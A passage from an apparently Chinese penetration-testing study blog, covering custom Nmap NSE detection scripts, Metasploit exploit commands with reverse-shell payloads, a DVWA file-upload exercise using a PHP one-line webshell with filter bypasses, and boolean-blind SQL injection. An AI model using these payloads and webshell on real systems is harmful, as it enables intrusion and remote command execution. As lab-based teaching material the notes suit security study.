<li>categories字段：这部分内容给出了该NSE所在的分类<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605111130915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在<code>/usr/share/nmap/scripts</code>文件里有一个<code>script.db</code>文件<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605111802505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605111048122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. 目前一共有4种规则<br>1、Prerule()规则，这个规则的执行要早于Nmap的扫描，因此这类脚本不会调用Nmap扫描得到的任何结果。执行的顺序是先脚本，后Nmap扫描<br>2、Hostrule()规则，这个规则是在Nmap已经完成了主机发现之后执行的，根据主机发现的结果来触发该类脚本。执行的顺序是先Nmap主机发现，后脚本<br>3、Portrule()规则，这个规则与hostrule()规则相类似，不过是在执行了端口扫描或版本侦测时才会触发的脚本，这个规则的执行与端口的状态联系紧密。执行的顺序是先Nmap端口扫描，后脚本<br>4、Postrule()规则，这个规则是在Nmap已经完成所有的扫描之后才执行，一般用来处理扫描结果。执行的顺序是当所有的扫描都结束以后才会执行脚本<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605113127179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个host是主机， port 是端口<br>6. rule字段<br>描述脚本执行的规则，也就是确定触发脚本执行的条件。这个规则是一个Lua函数，返回值只有true和false两种。只有当rule字段返回true时，action中的函数才会执行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605113841870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="7">
<li>action字段：脚本执行的具体内容。当脚本通过rule字段的检查被触发执行时，就会调用action字段定义的函数<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060511274735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>编写一个脚本、<br>文件名是<code>my-http-detect.nse</code><br>类型是<code>default</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605121519316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 代码是<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function( host, port )</span><br><span class="line">	return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 80 and port.service &#x3D;&#x3D;  &quot;http&quot; and port.state &#x3D;&#x3D; &quot;open&quot;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	return &quot; This is a WebServer&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>1.代码解释</strong><br><code>port.protocol == &quot;tcp&quot; and port.number == 80 and port.service ==  &quot;http&quot; and port.state == &quot;open&quot;</code><br><code>action = function(host, port)</code><br><code>return &quot; This is a WebServer&quot;</code><br>这样当目标服务器上开放的80端口运行着HTTP服务的时候，就可以执行action部分。编写当portrule返回值成功的时候执行的代码</p>
<p><strong>2.导入到nmap脚本数据库</strong><br>叫<code>my-http-detect.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>3.使用<br>导入成功后就可以使用了<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  --script my-http-detect [目标]</span><br></pre></td></tr></table></figure>
<p>结果<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060511572552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="NSE脚本实例应用：垃圾邮件木马的检测"><a href="#NSE脚本实例应用：垃圾邮件木马的检测" class="headerlink" title="NSE脚本实例应用：垃圾邮件木马的检测"></a>NSE脚本实例应用：垃圾邮件木马的检测</h2><p>下面是目标主机的端口进行检测。查看是否有异常的端口开放了SMTP服务。输出这个异常的端口</p>
<ol>
<li>应为是这个脚本是通过对目标主机端口扫描的结果分析得到的<br>所以选择的是<code>execution</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605120942245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">local shortport = <span class="keyword">require</span> <span class="string">&quot;shortport&quot;</span></span><br><span class="line"></span><br><span class="line">description = [[]]</span><br><span class="line"></span><br><span class="line">author = <span class="string">&quot;root&quot;</span></span><br><span class="line"></span><br><span class="line">license = <span class="string">&quot;Same as Nmap--See http://nmap.org/book/man-legal.html&quot;</span></span><br><span class="line"></span><br><span class="line">categories = &#123;<span class="string">&quot;external&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span>(<span class="params"> host, port </span>)</span></span><br><span class="line"><span class="function">	<span class="title">return</span> <span class="title">port</span>.<span class="title">service</span> == &quot;<span class="title">smtp</span>&quot; <span class="title">and</span></span></span><br><span class="line"><span class="function">			<span class="title">port</span>.<span class="title">number</span> ~= 25      <span class="title">and</span> <span class="title">port</span>.<span class="title">number</span> ~= 465      <span class="title">and</span> <span class="title">port</span>.<span class="title">number</span> ~= 587</span></span><br><span class="line"><span class="function">			<span class="title">and</span> <span class="title">port</span>.<span class="title">protocol</span> == &quot;<span class="title">tcp</span>&quot;     </span></span><br><span class="line"><span class="function">			<span class="title">and</span> <span class="title">port</span>.<span class="title">state</span> == &quot;<span class="title">open</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">action</span> = <span class="title">function</span>(<span class="params">host, port</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">return</span> </span></span><br><span class="line"><span class="function">  &quot;<span class="title">Mail</span> <span class="title">server</span> <span class="title">on</span> <span class="title">unusual</span> <span class="title">port</span>: <span class="title">possible</span> <span class="title">malware</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br></pre></td></tr></table></figure>
<p>代码介绍<br>1.<code>port.service == &quot;smtp&quot;</code><br>要对这个检测得到的port表中的所有内容进行检测，首先查看是否有SMTP服务<br>2.<code>port.number ~= 25</code>  和  <code>port.number ~= 465</code>  和  <code> port.number ~= 587</code>  <code>port.protocol == &quot;tcp&quot;</code>  <code>port.state == &quot;open&quot;</code><br>测该服务是否在不正常的端口上运行，SMTP正常应该运行在25、465或者587端口上,结果如果不符合上面的规则，就输出<br><code>return &quot;Mail server on unusual port: possible malware&quot;</code></p>
<p>叫代码文件移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p><strong>开始扫描</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap  --script 脚本名 [目标]</span><br></pre></td></tr></table></figure>
<p>扫描结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605124301568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>nmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Metasploit之Exploit模块</title>
    <url>/2020/08/09/4.%20Metasploit%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="再学Metasploit"><a href="#再学Metasploit" class="headerlink" title="再学Metasploit"></a>再学Metasploit</h2><h2 id="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"><a href="#之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来" class="headerlink" title="之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来"></a>之前学习的Metasploit没有写笔记都忘掉了，这次叫完整的学习内容记录下来</h2><h2 id="1-Active-Exploit-主动的"><a href="#1-Active-Exploit-主动的" class="headerlink" title="1. Active Exploit 主动的"></a>1. Active Exploit 主动的</h2><ul>
<li>某种服务器开放的端口，攻击者主动发起漏洞利用代码，比如反弹shell代码执行，拿到目标shell</li>
<li>主动的就是主动发起漏洞利用代码</li>
</ul>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set RHOST 192.168.1.100						&#x2F;&#x2F;目标ip</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp     &#x2F;&#x2F;一个反弹的shell</span><br><span class="line">set LHOST 192.168.1.1						&#x2F;&#x2F;要反弹的那个ip</span><br><span class="line">set LPORT 4444			</span><br><span class="line">set SMBUSER 系统用户名</span><br><span class="line">set SMBPASS 系统密码</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417180810219.png" alt="在这里插入图片描述"></p>
<h2 id="2-Passive-Exploit被动的"><a href="#2-Passive-Exploit被动的" class="headerlink" title="2. Passive Exploit被动的"></a>2. Passive Exploit被动的</h2><p>​    </p>
<ul>
<li>被攻击者是不存在漏洞的，漏洞存在客户端软件上，客户端访问远程服务器端的服务，服务器端存在漏洞利用代码，客户端程序存在漏洞，造成客户端漏洞被利用</li>
</ul>
<ol>
<li>命令</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms07_017_ani_loadimage_chunksize</span><br><span class="line">set SRVHOST 192.168.0.109						&#x2F;&#x2F;自己的ip</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp		 &#x2F;&#x2F;目标访问我的web一个反弹的shell</span><br><span class="line">set LHOST 192.168.1.1						&#x2F;&#x2F;要反弹的那个ip</span><br><span class="line">set PORT 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p>启动<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041718505522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目标访问漏洞就触发了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417185122218.png" alt="在这里插入图片描述"><br>看到有一个shell连接上来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041718531363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417185901367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>​    </p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>4,手动挖掘漏洞，文件上发漏洞</title>
    <url>/2019/09/24/4,%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E5%8F%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务088：手动漏洞挖掘（四）</p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a><strong>文件上传漏洞</strong></h2><p><strong>文件上传漏洞是非常经典的漏洞，非常有名的漏洞，文件上这个功能传不能说是一个漏洞应为文件上传web应用需要的程序，比如在论坛里上发一个一些头像图片的话是非常好的功能，电子商务比如要上发身份证，为什么叫他叫做漏洞是应为主要是程序员没有做好web的编码和web过滤的了解欠缺，web上传做的好的话其实是可以完全不了的</strong></p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>实验靶机metasploitable-linux-2.0.0里面的DVWA</p>
<h2 id="正常情况文件上发"><a href="#正常情况文件上发" class="headerlink" title="正常情况文件上发"></a>正常情况文件上发</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142134336.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142147860.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142158557.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142207112.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142215691.png" alt="在这里插入图片描述"><br>这样就可以看见我刚才上发的文件了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924142249287.png" alt="在这里插入图片描述"></p>
<h2 id="低安全级别上发木马"><a href="#低安全级别上发木马" class="headerlink" title="低安全级别上发木马"></a>低安全级别上发木马</h2><p><strong>下面是低安全级别，然后上发木马</strong><br>下面是操作<br>先创建一个木马文件文件名a.php<br>内容<code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code>这个是个一句话的木马可以叫是输入的URL变成目标web的系统命令<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924143220477.png" alt="在这里插入图片描述"><br>开始上发<br>发现已经上发成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924143908955.png" alt="在这里插入图片描述"><br>然后我就可以利用这个木马进行系统命令操作<br>访问这个目录<br>复制到URL里要运行这个木马文件里的cmd这个所有要添加 ?cmd=pwd这个pwd就是你要输入的命令pwd是查看当前文件所在的位置<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924144502463.png" alt="在这里插入图片描述">然后回车访问这个web就可以查看当前文件所在的位置了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924144644933.png" alt="在这里插入图片描述"><br>在换一个ls试试ls是查看当前文件里的内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019092414473622.png" alt="在这里插入图片描述">这个靶机的级别是低是没有进行过滤的</p>
<p>上发请求的包<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924145757165.png" alt="在这里插入图片描述"></p>
<p>用截断代理修改发送文件的大小限制<br>发送一个大于1mb的照片<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019092418124066.png" alt="在这里插入图片描述"><br>先用burp截断下来<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924181749998.png" alt="在这里插入图片描述"><br>然后 就可以不受限制了这个靶机是低级别的没有过滤任何东西<br>![在这里插入图片描述](<a href="https://img-blog.csdnimg.cn/20190924182031122.png">https://img-blog.csdnimg.cn/20190924182031122.png</a></p>
<p>下面是他的源代码    </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line">$target_path = $target_path . basename( $_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $target_path)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $target_path . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="中安全级别上发木马"><a href="#中安全级别上发木马" class="headerlink" title="中安全级别上发木马"></a>中安全级别上发木马</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924192126166.png" alt="在这里插入图片描述"><br>正常情况下是可以发送正常的照片的    这个是就不演示；<br>下面就可以修改请求来<br>正常情况是上发不了文件的只能上发照片<br>可以看到是无法上发文件的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924193243630.png" alt="在这里插入图片描述"><br>修改请求的内容还是可以发送文件的这个文件里有一个短语言的木马<br>修改请求下面这个照片是没有修改的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924193708333.png" alt="在这里插入图片描述"><br>下面这个进行修改过的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924194013449.png" alt="在这里插入图片描述"><br>修改后上发文件就成功了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924194146220.png" alt="在这里插入图片描述"><br>       还可以执行命令的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924194318737.png" alt="在这里插入图片描述"></p>
<h2 id="查看webshell是什么内型的"><a href="#查看webshell是什么内型的" class="headerlink" title="查看webshell是什么内型的"></a>查看webshell是什么内型的</h2><p>a.php文件内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924201852233.png" alt="在这里插入图片描述"><br>文件类型是从前大概10个字节进行定义的<br>查看前10字节可以判断文件类型<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924200216970.png" alt="在这里插入图片描述"><br>把a.php修改成a.txt<br>查看类型还是php类型应为他先看你的文件头然后在查看文件的具体内容<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924201644138.png" alt="在这里插入图片描述"></p>
<h2 id="高安全级别上发木马"><a href="#高安全级别上发木马" class="headerlink" title="高安全级别上发木马"></a>高安全级别上发木马</h2><p>正常访问是可以正常上发的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924202448403.png" alt="在这里插入图片描述">上发a.php就不能上发过去了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924202659636.png" alt="在这里插入图片描述">修改文件类型也是上发过去的发送a.php是个木马<br>没有修改的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924203813453.png" alt="在这里插入图片描述"><br>修改请求<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924203019468.png" alt="在这里插入图片描述"><br>也是发送不过去的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924203120771.png" alt="在这里插入图片描述"><br>这个在加上后缀就可以上发过去了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924203548396.png" alt="在这里插入图片描述">可以看到已经成功上发<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924203659276.png" alt="在这里插入图片描述">是可以运行命令的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190924204050497.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>手动挖掘漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>4. 网易web安全渗透， sql 布尔型盲注</title>
    <url>/2020/08/10/4.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%20%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="sql注入漏洞布尔型盲注原理"><a href="#sql注入漏洞布尔型盲注原理" class="headerlink" title="sql注入漏洞布尔型盲注原理"></a>sql注入漏洞布尔型盲注原理</h2><h3 id="下面的代码"><a href="#下面的代码" class="headerlink" title="下面的代码"></a>下面的代码</h3><p>不管你输入正确就显示Right，你输入错误显示Wrong没有其他的<br>就是你不管输入什么就有两个结果<br>这个我们就可以通过真和假来判断</p>
<h3 id="他是怎么实现查询数据库的那"><a href="#他是怎么实现查询数据库的那" class="headerlink" title="他是怎么实现查询数据库的那"></a>他是怎么实现查询数据库的那</h3><p><strong>zhao</strong><br>这个zhao是数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我进行猜他一个一个字符的猜他</span><br><span class="line">第一个字符是不是a</span><br><span class="line">返回Wrong</span><br><span class="line"></span><br><span class="line">第一个字符是不是z</span><br><span class="line">返回Right</span><br><span class="line"></span><br><span class="line">第二个字符是不是za</span><br><span class="line">返回Wrong</span><br><span class="line"></span><br><span class="line">第二个字符是不是zh</span><br><span class="line">返回Right</span><br><span class="line"></span><br><span class="line">等等。。。。。。。。</span><br></pre></td></tr></table></figure>
<p>知道猜叫名猜出来</p>
<h2 id="布尔型盲注方法"><a href="#布尔型盲注方法" class="headerlink" title="布尔型盲注方法"></a>布尔型盲注方法</h2><h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p>left()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805151723936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="left-函数进行注入"><a href="#left-函数进行注入" class="headerlink" title="left()函数进行注入"></a>left()函数进行注入</h4><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p><strong>判断第一个字符是什么</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;d&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>结果<br>结果是d<br>可以看见输入a是错的，输入d是对的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153244203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p><strong>判断第二个字符是什么</strong><br>第一个字符是d<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153438597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以此类推到最后一个<br>结果就出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153556950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="regexp函数"><a href="#regexp函数" class="headerlink" title="regexp函数"></a>regexp函数</h3><p>SQL中的正则表达式(regexp)</p>
<h4 id="regexp进行布尔型盲注"><a href="#regexp进行布尔型盲注" class="headerlink" title="regexp进行布尔型盲注"></a>regexp进行布尔型盲注</h4><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>下面这个<code>^</code>的意思就是，字符串的起始字符串是什么</p>
<ol>
<li><strong>判断第一个字符是什么</strong><br>结果是d</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()  regexp <span class="string">&#x27;^d&#x27;</span>; </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805161625488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="2">
<li>判断第二个字符是什么<br>结果是v<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080516181824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
